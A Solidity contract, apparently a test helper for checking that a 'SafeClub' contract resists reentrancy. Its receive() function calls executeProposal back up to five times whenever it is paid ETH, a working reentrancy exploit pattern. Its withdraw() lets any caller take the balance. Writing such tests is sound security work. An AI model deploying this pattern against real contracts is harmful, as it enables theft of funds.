// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISafeClub {
    function executeProposal(uint256 _proposalId) external;
    function getProposal(uint256 _proposalId)
        external
        view
        returns (
            uint256,
            string memory,
            address,
            uint256,
            uint256,
            uint256,
            uint256,
            bool
        );
}

contract ReentrancyAttacker {
    ISafeClub public target;
    uint256 public attackCount;
    uint256 public fundsReceived;

    uint256 public constant MAX_ATTACKS = 5;

    event AttackAttempted(uint256 count);
    event FundsReceived(uint256 amount, uint256 totalReceived);

    constructor(address _target) {
        require(_target != address(0), "Invalid target address");
        target = ISafeClub(_target);
    }

    /**
     * @notice Fonction appelée automatiquement lors de la réception d'ETH
     * @dev Tente une attaque par reentrancy en rappelant executeProposal
     */
    receive() external payable {
        fundsReceived += msg.value;

        if (attackCount < MAX_ATTACKS) {
            attackCount++;
            emit AttackAttempted(attackCount);

            // Tentative de reentrancy
            try target.executeProposal(0) {
                // Si SafeClub est vulnérable, l'appel passe
            } catch Error(string memory) {
                // SafeClub a correctement rejeté l'appel
                emit FundsReceived(msg.value, fundsReceived);
            } catch {
                emit FundsReceived(msg.value, fundsReceived);
            }
        } else {
            emit FundsReceived(msg.value, fundsReceived);
        }
    }

    /// @notice Retourne le solde du contrat attaquant
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /// @notice Retire les fonds vers l'appelant
    function withdraw() external {
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to withdraw");

        (bool success, ) = payable(msg.sender).call{value: balance}("");
        require(success, "Withdraw failed");
    }
}